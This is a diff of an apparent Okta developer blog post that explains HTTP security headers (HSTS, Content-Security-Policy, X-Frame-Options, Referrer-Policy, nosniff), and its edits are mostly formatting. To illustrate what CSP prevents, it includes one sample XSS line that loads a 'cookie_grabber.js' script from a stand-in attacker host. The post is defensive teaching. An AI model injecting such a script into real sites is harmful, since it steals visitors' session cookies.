@@ -27,7 +27,8 @@ HTTP security headers are HTTP response headers designed to enhance the security
 ### HTTP Strict Transport Security (HSTS)
 
 First, the Strict-Transport-Security header forces the browser to communicate with HTTPS instead of HTTP. HTTPS is the encrypted version of the HTTP protocol. Strictly using HTTPS can prevent most man-in-the-middle and session hijacking attacks.
-This header has two configuration options: "max-age" and "includeSubDomains". "max-age" is the number of seconds the browser should remember this setting. And if "includeSubDomains" is selected, the settings will apply to any subdomains of the site as well.
+
+This header has two configuration options: `max-age` and `includeSubDomains`. `max-age` is the number of seconds the browser should remember this setting. And if `includeSubDomains` is selected, the settings will apply to any subdomains of the site as well.
 
 ```
 Strict-Transport-Security: max-age=31536000 ; includeSubDomains
@@ -43,19 +44,19 @@ The Content-Security-Policy header controls which resource the browser is allowe
 <script src="attacker.com/cookie_grabber.js"></script>
 ```
 
-There are many different directives of the policy, but the most important one is "script-src", which defines where scripts can be loaded from. Other directives include "default-src", "object-src", "img-src", and more. You can define a policy using the header syntax:
+There are many different directives of the policy, but the most important one is `script-src`, which defines where scripts can be loaded from. Other directives include `default-src`, `object-src`, `img-src`, and more. You can define a policy using the" header syntax:
 
 ```
 Content-Security-Policy: RESOURCE-TYPE ORIGIN ORIGIN ORIGIN ...
 ```
 
-For example, this policy limits the source of scripts to the current domain, and "www.okta.com". "self" represents the current domain.
+For example, this policy limits the source of scripts to the current domain, and "www.okta.com". `self` represents the current domain.
 
 ```
 Content-Security-Policy: script-src 'self' https://www.okta.com
 ```
 
-The "default-src" directory defines the policy for any resource that does not already have a policy. For example, this policy tells the browsers that all scripts should come from subdomains of "okta.com", and all other resources should only load from the current domain.
+The `default-src` directive defines the policy for any resource that does not already have a policy. For example, this policy tells the browsers that all scripts should come from subdomains of "okta.com", and all other resources should only load from the current domain.
 
 ```
 Content-Security-Policy: default-src 'self'; script-src https://*.okta.com
@@ -86,7 +87,7 @@ X-XSS-Protection: 0
 
 The X-Frame-Options header prevents clickjacking attacks. Clickjacking is an attack in which attackers frame the victim site as a transparent layer on a malicious page to trick users into executing unwanted actions.
 
-This header instructs the browser whether the page's contents can be rendered in an iframe. There are three options: "DENY", "SAMEORIGIN", and "ALLOW-FROM".
+This header instructs the browser whether the page's contents can be rendered in an iframe. There are three options: `DENY`, `SAMEORIGIN`, and `ALLOW-FROM`.
 
 ```
 X-Frame-Options: DENY (Page cannot be framed)
@@ -100,7 +101,7 @@ One of these options should be set on all pages that contain state-changing acti
 
 ### Referrer-Policy
 
-The Referrer-Policy header tells the browser when to send Referrer information. This can help prevent information leakages offsite via Referrer URLs. There are many options for this header, the most useful ones being no-referrer, origin, origin-when-cross-origin, and same-origin. Note that "referrer" is not misspelled in this header!
+The Referrer-Policy header tells the browser when to send Referrer information. This can help prevent information leakages offsite via Referrer URLs. There are many options for this header, the most useful ones being `no-referrer`, `origin`, `origin-when-cross-origin`, and `same-origin`. Note that "referrer" is not misspelled in this header!
 
 ```
 Referrer-Policy: no-referrer (Do not send referer)
@@ -118,7 +119,7 @@ You should consider using one of the above options as your Referrer-Policy heade
 
 This header prevents MIME-sniffing. MIME-sniffing is when browsers try to determine the document's file type by examining its content and disregarding the server's instructions set in the Content-Type header.
 
-MIME-sniffing is a useful feature but can lead to vulnerabilities. For example, an attacker can upload a JavaScript file with the extension of an image file. When others try to view the image, their browsers detect that the file is a JavaScript file and execute it instead of rendering it as an image. Setting this header to "nosniff" will prevent MIME-sniffing.
+MIME-sniffing is a useful feature but can lead to vulnerabilities. For example, an attacker can upload a JavaScript file with the extension of an image file. When others try to view the image, their browsers detect that the file is a JavaScript file and execute it instead of rendering it as an image. Setting this header to `nosniff` will prevent MIME-sniffing.
 
 ```
 X-Content-Type-Options: nosniff
@@ -207,7 +208,9 @@ Major cloud providers also give you options to customize the security headers yo
 ```
 
 For more information about how to configure security headers on different cloud providers, such as Heroku, Netlify, and AWS, read [Angular Deployment with a Side of Spring Boot](/blog/2020/05/29/angular-deployment).
-### Learn more about Security Headers
+
+### Learn More About Security Headers
+
 In this post, we looked at some of the most important HTTP security headers. By using these headers on your site, you'll be able to prevent some basic attacks and improve your site's security! [securityheaders.com](https://securityheaders.com) is a good resource to help you implement the correct security headers. It can scan your website and point out which security headers you have implemented and which are still missing. You can even [try it on this site](https://securityheaders.com/?q=developer.okta.com%2Fblog&followRedirects=on). 
 
 Got questions or feedback about HTTP security headers and how to improve the security score of your webpages? Drop a comment below, we're happy to hear from you. Want to stay up to date on the latest articles, videos, and events from the Okta DevRel team? Follow our social channels: [@oktadev on Twitter](https://twitter.com/oktadev), [Okta for Developers on LinkedIn](https://www.linkedin.com/company/oktadev), [Twitch](https://www.twitch.tv/oktadev), and [YouTube](https://youtube.com/oktadev).
